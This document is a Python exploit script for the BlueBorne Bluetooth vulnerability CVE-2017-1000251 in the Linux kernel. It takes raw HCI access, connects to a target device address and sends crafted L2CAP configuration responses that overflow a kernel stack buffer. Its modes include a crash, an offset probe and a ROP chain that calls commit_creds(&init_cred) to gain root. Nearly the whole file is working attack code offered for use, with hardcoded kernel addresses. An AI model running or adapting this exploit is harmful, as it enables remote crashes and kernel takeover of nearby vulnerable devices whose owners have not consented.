#!/usr/bin/env python3
"""BlueBorne CVE-2017-1000251 — L2CAP EFS Amplification via HCI_CHANNEL_USER
Uses exclusive HCI access (HCI_CHANNEL_USER) to bypass kernel L2CAP consumption.
The kernel's BT stack is fully detached — we handle ACL connection + L2CAP signaling."""
import socket
import struct
import time
import select
import sys
import os
import subprocess

TARGET = sys.argv[1] if len(sys.argv) > 1 else '02:00:00:00:00:21'
MODE = sys.argv[2] if len(sys.argv) > 2 else 'info'

COMMIT_CREDS = 0xC0054328
PREPARE_KERNEL_CRED = 0xC00548E0
L2CAP_CID_SIG = 0x0001

def l2cap_cmd(code, ident, data):
    return struct.pack('<BBH', code, ident, len(data)) + data

def build_efs_overflow(ident, dcid, addr):
    """UNACCEPT path: first valid EFS sets efs struct, then short EFS options
    replay the same struct values into the output buffer (18 bytes each).
    The efs struct has our addr at 4-byte aligned positions."""
    addr_le = struct.pack('<I', addr)
    # EFS struct (16 bytes): id(1), stype(1), msdu(2), sdu_itime(4), acc_lat(4), flush_to(4)
    # We want our addr at the 4-byte aligned positions: sdu_itime, acc_lat, flush_to
    # Set stype=0x01 (guaranteed != local_stype=0 to trigger the write)
    efs_data = bytes([0x01, 0x01]) + struct.pack('<H', 0x0200) + addr_le * 3
    options = bytes([0x06, 16]) + efs_data  # First valid EFS (18 bytes out)
    for _ in range(14):
        options += bytes([0x06, 1, 0x01])  # Short EFS (3 in → 18 out each)
    payload = struct.pack('<HHH', dcid, 0, 0x0001) + options  # UNACCEPT
    return l2cap_cmd(0x05, ident, payload)

def build_efs_rop(ident, dcid):
    """UNACCEPT path with ROP: pop {r0, pc} → commit_creds(&init_cred).
    
    The EFS struct gets replayed in EVERY 18-byte output block.
    Each block: [0x06, 0x10, id, stype, msdu_lo, msdu_hi, 
                 sdu_itime(4), acc_lat(4), flush_to(4)]
    
    The 3 controlled 4-byte words per block are: sdu_itime, acc_lat, flush_to.
    They repeat every 18 bytes across the entire overflow region.
    
    Since we don't know the exact alignment, spray a pattern:
    sdu_itime = POP_R0_PC (gadget: pop {r0, pc})
    acc_lat   = INIT_CRED (r0 value for commit_creds)
    flush_to  = COMMIT_CREDS (pc value after pop)
    
    If the saved PC aligns with sdu_itime: pop {r0, pc} → r0=INIT_CRED, pc=COMMIT_CREDS → ROOT!
    If it aligns with acc_lat: jump to INIT_CRED (crash, but try again)
    If it aligns with flush_to: jump to COMMIT_CREDS with garbage r0 (crash)
    
    We have a 1-in-3 chance per attempt that saved PC aligns with sdu_itime.
    """
    efs_data = struct.pack('<BBHIII',
        0x01, 0x01,  # id=1, stype=1 (triggers write)
        0x0200,      # msdu
        POP_R0_PC,   # sdu_itime → if PC lands here, we win
        INIT_CRED,   # acc_lat → becomes r0 after pop
        COMMIT_CREDS)# flush_to → becomes pc after pop
    options = bytes([0x06, 16]) + efs_data  # First valid EFS
    for _ in range(14):
        options += bytes([0x06, 1, 0x01])  # Short EFS amplification
    payload = struct.pack('<HHH', dcid, 0, 0x0001) + options  # UNACCEPT
    return l2cap_cmd(0x05, ident, payload)

def build_pending_overflow(ident, dcid, addr):
    """PENDING path: no size check in kernel. Send full EFS options directly.
    Each option: 2-byte header + 16 controlled bytes = 18 bytes output.
    We send enough to overflow buf[64] by 200+ bytes."""
    addr_le = struct.pack('<I', addr)
    # EFS struct with addr sprayed across all 4-byte positions
    efs_data = bytes([0x01, 0x01]) + struct.pack('<H', 0x0200) + addr_le * 3
    options = b''
    # First: fill buf[64] with MTU options (4 bytes each × 15 = 60 bytes)
    for _ in range(15):
        options += bytes([0x01, 2]) + struct.pack('<H', 0x0200)
    # Now overflow with EFS options containing our address
    for _ in range(12):
        options += bytes([0x06, 16]) + efs_data  # 18 bytes each × 12 = 216 overflow
    payload = struct.pack('<HHH', dcid, 0, 0x0004) + options  # PENDING
    return l2cap_cmd(0x05, ident, payload)

def build_probe_overflow(ident, dcid):
    """Probe mode: unique pattern at each 4-byte offset to find exact LR position.
    Uses UNACCEPT+EFS. After crash, the PC value in ramdump/dmesg reveals offset."""
    # EFS struct: 16 bytes with unique marker at each word
    # When amplified, the EFS struct values get repeated in every 18-byte output block
    # So we use a recognizable base pattern
    efs_data = struct.pack('<BBHIII',
        0x01, 0x01,  # id, stype (triggers write condition)
        0x4141,      # msdu
        0x42424242,  # sdu_itime — marker 'BBBB'
        0x43434343,  # acc_lat — marker 'CCCC'
        0x44444444)  # flush_to — marker 'DDDD'
    options = bytes([0x06, 16]) + efs_data
    for _ in range(14):
        options += bytes([0x06, 1, 0x01])
    payload = struct.pack('<HHH', dcid, 0, 0x0001) + options
    return l2cap_cmd(0x05, ident, payload)

INIT_CRED = 0xC0AA0818
POP_R0_PC = 0xC0013584
L2CAP_CONF_PENDING = 0x0004

def build_root_payload(ident, dcid):
    """Root payload: commit_creds(&init_cred) via pop {r0, pc} gadget.
    
    Overflow layout (after buf[64]):
    Each EFS output block = [0x06][0x10][16 bytes of efs struct]
    The efs struct from the first valid EFS gets replayed by short EFS options.
    
    efs struct layout (16 bytes):
      [id=1] [stype=1] [msdu=2] [sdu_itime=4] [acc_lat=4] [flush_to=4]
    
    Each 18-byte output block:
      byte 0-1: header (0x06, 0x10) — NOT controlled
      byte 2-3: id + stype  
      byte 4-5: msdu
      byte 6-9: sdu_itime (4-byte aligned word)
      byte 10-13: acc_lat (4-byte aligned word) 
      byte 14-17: flush_to (4-byte aligned word)
    
    Strategy: spray POP_R0_PC as the default address everywhere.
    The stack pop reads 9 words (r4-r11, pc). We don't know exact alignment
    of saved regs relative to our EFS output blocks. So:
    - Put POP_R0_PC at all 4-byte positions in the EFS struct
    - After pop {r4-r11, pc}: pc=POP_R0_PC (wherever it lands)
    - pop {r0, pc} reads next 2 words from stack:
      r0 = INIT_CRED (from more overflow data)
      pc = COMMIT_CREDS (from more overflow data)
    - commit_creds(&init_cred) → root!
    
    BUT: the 2 header bytes (0x06, 0x10) in every 18-byte block means
    not all words are our address. Some will be [0x06, 0x10, id, stype] = garbage.
    
    Mitigation: use the first valid EFS to set sdu_itime/acc_lat/flush_to 
    to POP_R0_PC, and also put INIT_CRED and COMMIT_CREDS at other positions
    so they appear later on the stack for pop {r0, pc}.
    """
    # Strategy: alternate between two EFS structs in the overflow:
    # EFS-A: all 4-byte words = POP_R0_PC (for the initial pop {r4-r11, pc})
    # After pc=POP_R0_PC, it does pop {r0, pc} from the next stack words
    # Those words come from the NEXT EFS blocks which should contain:
    # INIT_CRED (for r0) then COMMIT_CREDS (for pc)
    
    # But we only get one EFS struct value (the first valid one).
    # All subsequent short EFS repeat the SAME struct.
    # So ALL overflow blocks contain the same 3 words.
    #
    # Best approach: put POP_R0_PC in sdu_itime and acc_lat,
    # put INIT_CRED in flush_to. Then after pop {r0, pc}:
    # - If r0 gets POP_R0_PC: crash (but it's a kernel address, might survive)
    # - If r0 gets INIT_CRED: jackpot!
    # - pc needs to be COMMIT_CREDS...
    #
    # Actually: just spray COMMIT_CREDS everywhere instead.
    # commit_creds(whatever) — if r0 happens to be near init_cred, we win.
    # r0 after pop from our overflow = one of our sprayed values.
    #
    # SIMPLEST WINNING STRATEGY:
    # Spray ONLY commit_creds address (0xC0054328).
    # r0 will also be 0xC0054328 (since every word is the same).
    # commit_creds(0xC0054328) treats 0xC0054328 as a cred pointer.
    # This will crash (bad cred pointer).
    #
    # CORRECT STRATEGY:
    # Use 2 different valid EFS options to alternate values:
    # Option 1: efs struct with all fields = POP_R0_PC
    # Option 2: efs struct with fields = [INIT_CRED, COMMIT_CREDS, POP_R0_PC]
    # But UNACCEPT path only lets us set the efs struct ONCE (first valid EFS).
    #
    # SOLUTION: Use PENDING path! No size limit, we can send full EFS options
    # with different values in each one.
    
    # Use PENDING path for precise control
    options = b''
    # Phase 1: Fill buf[64] with padding (MTU options, 4 bytes each)
    for _ in range(15):
        options += bytes([0x01, 2]) + struct.pack('<H', 0x0200)  # 60 bytes
    
    # Phase 2: Overflow with ROP chain
    # We need at least 128 bytes of overflow to reach saved LR.
    # Then 36 more for saved regs (r4-r11, pc) + more for pop chain.
    # Use a mix: spray POP_R0_PC for the saved regs block,
    # then [INIT_CRED, COMMIT_CREDS] for the pop chain.
    
    # Block 1-6: spray POP_R0_PC to hit saved r4-r11 and pc
    for _ in range(6):
        efs_data = struct.pack('<BBHIII',
            0x01, 0x01, 0x0200,
            POP_R0_PC, POP_R0_PC, POP_R0_PC)
        options += bytes([0x06, 16]) + efs_data  # 18 bytes each = 108 bytes
    
    # Block 7-8: INIT_CRED + COMMIT_CREDS for pop {r0, pc}
    for _ in range(3):
        efs_data = struct.pack('<BBHIII',
            0x01, 0x01, 0x0200,
            INIT_CRED, COMMIT_CREDS, POP_R0_PC)
        options += bytes([0x06, 16]) + efs_data  # 18 bytes each = 54 bytes
    
    payload = struct.pack('<HHH', dcid, 0, L2CAP_CONF_PENDING) + options
    return l2cap_cmd(0x05, ident, payload)

def send_acl(sock, handle, cid, payload, use_user_channel=None):
    if use_user_channel is None:
        use_user_channel = USING_USER_CHANNEL
    l2cap = struct.pack('<HH', len(payload), cid) + payload
    acl_flags = (handle & 0x0FFF) | (0x02 << 12)  # PB=0b10 (first automatically-flushable)
    acl_hdr = struct.pack('<HH', acl_flags, len(l2cap))
    # Both USER channel and hci_open_dev need HCI packet type indicator
    sock.send(b'\x02' + acl_hdr + l2cap)

def send_hci_cmd(sock, ogf, ocf, params=b''):
    opcode = (ogf << 10) | ocf
    hdr = struct.pack('<HB', opcode, len(params))
    if USING_USER_CHANNEL:
        sock.send(b'\x01' + hdr + params)  # HCI_COMMAND_PKT indicator
    else:
        sock.send(hdr + params)

def recv_all(sock, timeout=2.0):
    """Receive all available HCI packets within timeout."""
    packets = []
    deadline = time.time() + timeout
    while time.time() < deadline:
        remaining = deadline - time.time()
        if remaining <= 0:
            break
        ready = select.select([sock], [], [], min(remaining, 0.1))
        if ready[0]:
            try:
                data = sock.recv(1024)
                if data:
                    packets.append(data)
            except:
                break
    return packets

# ============================================================
# HCI_CHANNEL_USER: Exclusive HCI access
# ============================================================
HCI_CHANNEL_USER = 1
HCI_DEV = 0  # hci0
USING_USER_CHANNEL = False  # Will be set to True if USER channel bind succeeds

subprocess.run(['systemctl', 'stop', 'bluetooth'], capture_output=True)
time.sleep(0.5)
# Bring device down first — HCI_CHANNEL_USER requires it DOWN
subprocess.run(['hciconfig', f'hci{HCI_DEV}', 'down'], capture_output=True)
time.sleep(0.3)

overflow_addr = {'crash': 0xDEADBEEF, 'spray': PREPARE_KERNEL_CRED, 'info': None,
                 'probe': 0x42424242, 'root': PREPARE_KERNEL_CRED}.get(MODE)
print(f'=== CVE-2017-1000251 BlueBorne v4 (HCI_CHANNEL_USER) ===')
print(f'Target: {TARGET}  Mode: {MODE}')
if overflow_addr:
    print(f'Overflow addr: 0x{overflow_addr:08X}')

# Open HCI User Channel — exclusive access, kernel L2CAP fully detached
sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
# HCI_CHANNEL_USER requires raw bind with struct sockaddr_hci
import ctypes, ctypes.util
libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
# struct sockaddr_hci { sa_family_t hci_family(2); uint16_t hci_dev(2); uint16_t hci_channel(2); }
addr = struct.pack('<HHH', 31, HCI_DEV, HCI_CHANNEL_USER)  # AF_BLUETOOTH=31
rc = libc.bind(sock.fileno(), addr, len(addr))
if rc != 0:
    errno = ctypes.get_errno()
    import os as _os
    err_msg = _os.strerror(errno)
    print(f'[!] HCI_CHANNEL_USER bind failed: errno={errno} ({err_msg})')
    print('[!] Falling back to hci_open_dev approach...')
    sock.close()
    USING_USER_CHANNEL = False
    # Fallback: use PyBluez hci_open_dev + hcitool for ACL
    import bluetooth._bluetooth as _bt
    subprocess.run(['hciconfig', f'hci{HCI_DEV}', 'up'], capture_output=True)
    time.sleep(0.3)
    sock = _bt.hci_open_dev(HCI_DEV)
    flt = _bt.hci_filter_new()
    _bt.hci_filter_all_ptypes(flt)
    _bt.hci_filter_all_events(flt)
    sock.setsockopt(_bt.SOL_HCI, _bt.HCI_FILTER, flt)
    subprocess.run(['hcitool', 'dc', TARGET], capture_output=True)
    time.sleep(0.3)
    r = subprocess.run(['hcitool', 'cc', '--role=m', TARGET], capture_output=True, text=True, timeout=15)
    print(f'[fallback] hcitool cc: rc={r.returncode}')
    time.sleep(0.5)
    r = subprocess.run(['hcitool', 'con'], capture_output=True, text=True)
    handle = None
    for line in r.stdout.split('\n'):
        if TARGET.upper() in line.upper():
            parts = line.split()
            for i, p in enumerate(parts):
                if p == 'handle' and i+1 < len(parts):
                    handle = int(parts[i+1])
    print(f'[fallback] ACL handle: {handle}')
    if not handle:
        print('FAILED')
        sys.exit(1)
else:
    USING_USER_CHANNEL = True
    print(f'[+] HCI_CHANNEL_USER bound — exclusive access, kernel L2CAP detached')

    # With USER channel, WE must bring up the HCI device via HCI_Reset
    send_hci_cmd(sock, 0x03, 0x0003)  # OGF=Host_Ctl, OCF=Reset
    time.sleep(0.5)
    # Drain reset complete event
    recv_all(sock, 0.5)

    # Create ACL connection ourselves via HCI Create_Connection
    target_bytes = bytes(reversed([int(x, 16) for x in TARGET.split(':')]))
    # Create_Connection: BD_ADDR(6) + pkt_type(2) + pscan_rep(1) + reserved(1) + clock_off(2) + allow_role(1)
    params = target_bytes + struct.pack('<HBBHB', 0xCC18, 0x02, 0x00, 0x0000, 0x00)
    send_hci_cmd(sock, 0x01, 0x0005, params)  # OGF=Link_Ctl, OCF=Create_Connection
    print(f'[*] HCI Create_Connection sent to {TARGET}...')

    # Wait for Connection Complete event
    handle = None
    for _ in range(100):  # up to 10 seconds
        ready = select.select([sock], [], [], 0.1)
        if not ready[0]:
            continue
        data = sock.recv(1024)
        if not data or len(data) < 3:
            continue
        # USER channel: \x04 (HCI_EVENT_PKT) + evt_code + plen + evt_data
        if data[0] != 0x04:
            continue
        evt_code = data[1]
        evt_plen = data[2]
        evt_data = data[3:]
        if evt_code == 0x03 and len(evt_data) >= 11:  # Connection Complete
            status = evt_data[0]
            conn_handle = struct.unpack('<H', evt_data[1:3])[0]
            if status == 0:
                handle = conn_handle
                print(f'[+] ACL connected! handle=0x{handle:04x}')
                break
            else:
                print(f'[-] Connection failed: status=0x{status:02x}')
                break
        elif evt_code == 0x0F:  # Command Status
            status = evt_data[0] if evt_data else 0xFF
            if status != 0:
                print(f'[-] Command Status error: 0x{status:02x}')
    
    if not handle:
        print('FAILED - no ACL connection')
        sock.close()
        sys.exit(1)

print(f'[*] Starting L2CAP signaling (handle=0x{handle:04x})...')
time.sleep(0.3)

# Phase 1: Handle INFO exchange
print('[*] Phase 1: Handling INFO exchange...')
info_done = False
for _ in range(30):
    ready = select.select([sock], [], [], 0.1)
    if not ready[0]:
        continue
    data = sock.recv(1024)
    if not data or len(data) < 9:
        continue
    
    # Both USER channel and hci_open_dev: \x02 prefix for ACL
    if data[0] != 0x02:
        continue
    l2data_full = data[5:]
    
    if len(l2data_full) < 4:
        continue
    l2len, l2cid = struct.unpack('<HH', l2data_full[0:4])
    l2payload = l2data_full[4:4+l2len]
    
    if l2cid == L2CAP_CID_SIG and len(l2payload) >= 4:
        sig_code, sig_ident = l2payload[0], l2payload[1]
        sig_len = struct.unpack('<H', l2payload[2:4])[0]
        sig_data = l2payload[4:4+sig_len]
        if sig_code == 0x0A:  # INFO_REQ
            info_type = struct.unpack('<H', sig_data[:2])[0] if len(sig_data) >= 2 else 0
            print(f'  <- INFO_REQ type=0x{info_type:04x}')
            if info_type == 0x0002:
                rsp = l2cap_cmd(0x0B, sig_ident, struct.pack('<HHI', 2, 0, 0x00B8))
            elif info_type == 0x0003:
                rsp = l2cap_cmd(0x0B, sig_ident, struct.pack('<HH', 3, 0) + b'\x02' + b'\x00'*7)
            else:
                rsp = l2cap_cmd(0x0B, sig_ident, struct.pack('<HH', info_type, 1))
            send_acl(sock, handle, L2CAP_CID_SIG, rsp)
            print(f'  -> INFO_RSP type=0x{info_type:04x}')
            info_done = True
        elif sig_code == 0x0B:
            print(f'  <- INFO_RSP (from target)')

if not info_done:
    print('  [!] No INFO_REQ received, proceeding anyway...')
time.sleep(0.3)

# Phase 2: Send CONN_REQ
print('[*] Phase 2: Sending CONN_REQ...')
conn_req = l2cap_cmd(0x02, 0x01, struct.pack('<HH', 0x0001, 0x0040))
send_acl(sock, handle, L2CAP_CID_SIG, conn_req)
print(f'Sent CONN_REQ')

target_dcid = None
sent_exploit = False
next_ident = 2
got_conf_rsp = False

def parse_acl_packet(data):
    """Parse ACL data — both USER channel and hci_open_dev have \x02 prefix."""
    if len(data) < 9 or data[0] != 0x02:
        return None
    l2len, l2cid = struct.unpack('<HH', data[5:9])
    l2data = data[9:9+l2len]
    return (l2len, l2cid, l2data)

def is_disconnect_event(data):
    """Check if packet is HCI Disconnect Complete event."""
    # Both formats: \x04 (event indicator) + evt_code + plen + data
    return len(data) >= 3 and data[0] == 0x04 and data[1] == 0x05

for i in range(120):
    ready = select.select([sock], [], [], 1.0)
    if not ready[0]:
        if i % 10 == 0:
            print(f'  waiting... ({i}s)')
        continue

    data = sock.recv(1024)
    if not data:
        continue

    parsed = parse_acl_packet(data)
    if parsed:
        l2len, l2cid, l2data = parsed

        if l2cid == L2CAP_CID_SIG and len(l2data) >= 4:
            sig_code = l2data[0]
            sig_ident = l2data[1]
            sig_len = struct.unpack('<H', l2data[2:4])[0]
            sig_data = l2data[4:4+sig_len]

            if sig_code == 0x0A:  # INFO_REQ
                info_type = struct.unpack('<H', sig_data[:2])[0] if len(sig_data) >= 2 else 0
                print(f'  <- INFO_REQ type=0x{info_type:04x}')
                if info_type == 0x0002:
                    rsp = l2cap_cmd(0x0B, sig_ident, struct.pack('<HHI', 2, 0, 0x00B8))
                elif info_type == 0x0003:
                    rsp = l2cap_cmd(0x0B, sig_ident, struct.pack('<HH', 3, 0) + b'\x02' + b'\x00'*7)
                else:
                    rsp = l2cap_cmd(0x0B, sig_ident, struct.pack('<HH', info_type, 1))
                send_acl(sock, handle, L2CAP_CID_SIG, rsp)
                print(f'  -> INFO_RSP')

            elif sig_code == 0x03:  # CONN_RSP
                if len(sig_data) >= 8:
                    dcid, scid, result, status = struct.unpack('<HHHH', sig_data[:8])
                    print(f'  <- CONN_RSP dcid=0x{dcid:04x} result={result} status={status}')
                    if result == 0:  # SUCCESS
                        target_dcid = dcid
                        print(f'  +++ L2CAP CHANNEL OPEN! DCID=0x{dcid:04x}')
                    elif result == 1:  # PENDING (auth in progress)
                        print(f'  [*] Pending auth — waiting for final response...')
                        # Don't give up — a second CONN_RSP with result=0 will follow

            elif sig_code == 0x04:  # CONF_REQ
                req_dcid = struct.unpack('<H', sig_data[:2])[0] if len(sig_data) >= 2 else 0
                print(f'  <- CONF_REQ dcid=0x{req_dcid:04x}')
                # Reply SUCCESS
                rsp = l2cap_cmd(0x05, sig_ident, struct.pack('<HHH', req_dcid, 0, 0))
                send_acl(sock, handle, L2CAP_CID_SIG, rsp)
                print(f'  -> CONF_RSP(SUCCESS)')
                # Send our CONF_REQ
                if target_dcid:
                    creq = l2cap_cmd(0x04, next_ident, struct.pack('<HH', target_dcid, 0) + bytes([0x01,2,0,2]))
                    send_acl(sock, handle, L2CAP_CID_SIG, creq)
                    next_ident += 1
                    print(f'  -> CONF_REQ')

            elif sig_code == 0x05:  # CONF_RSP
                if len(sig_data) >= 6:
                    rsp_scid, rsp_flags, rsp_result = struct.unpack('<HHH', sig_data[:6])
                    print(f'  <- CONF_RSP scid=0x{rsp_scid:04x} result={rsp_result}')
                    got_conf_rsp = True

                    if not sent_exploit and target_dcid and MODE != 'info':
                        print(f'\n!!! SENDING OVERFLOW to DCID=0x{target_dcid:04x} !!!')
                        print(f'    Mode: {MODE}')
                        time.sleep(1)
                        if MODE == 'probe':
                            overflow = build_probe_overflow(next_ident, target_dcid)
                            print(f'    Probe pattern: BBBB=sdu_itime, CCCC=acc_lat, DDDD=flush_to')
                        elif MODE == 'root':
                            overflow = build_efs_rop(next_ident, target_dcid)
                            print(f'    ROP: pop{{r0,pc}}=0x{POP_R0_PC:08X} → r0=init_cred(0x{INIT_CRED:08X}) → commit_creds(0x{COMMIT_CREDS:08X})')
                        elif MODE == 'pending':
                            overflow = build_pending_overflow(next_ident, target_dcid, overflow_addr or 0xDEADBEEF)
                            print(f'    Using PENDING path (unlimited, more reliable)')
                        else:
                            overflow = build_efs_overflow(next_ident, target_dcid, overflow_addr)
                        send_acl(sock, handle, L2CAP_CID_SIG, overflow)
                        sent_exploit = True
                        print(f'OVERFLOW SENT ({len(overflow)} bytes)')
                        time.sleep(5)
                        break
            else:
                print(f'  <- SIG 0x{sig_code:02x}')

        elif l2cid != 0:
            print(f'  <- ACL CID=0x{l2cid:04x} len={l2len}')

    elif is_disconnect_event(data):
        print('  DISCONNECTED!')
        break
    elif len(data) >= 3 and data[0] == 0x04:
        # HCI event
        evt = data[1]
        if evt != 0x13:  # Skip Num Completed Packets
            print(f'  EVT 0x{evt:02x} len={len(data)}')

print(f'\n=== RESULTS ===')
print(f'DCID: {f"0x{target_dcid:04x}" if target_dcid else "NONE"}')
print(f'CONF_RSP: {got_conf_rsp}')
if sent_exploit:
    time.sleep(2)
    r = subprocess.run(['l2ping', '-c', '1', '-t', '3', TARGET], capture_output=True, text=True, timeout=8)
    alive = 'received' in r.stdout
    print(f'Target alive: {alive}')
    if not alive:
        print('*** CRASH CONFIRMED! ***')

subprocess.run(['hcitool', 'dc', TARGET], capture_output=True)
sock.close()
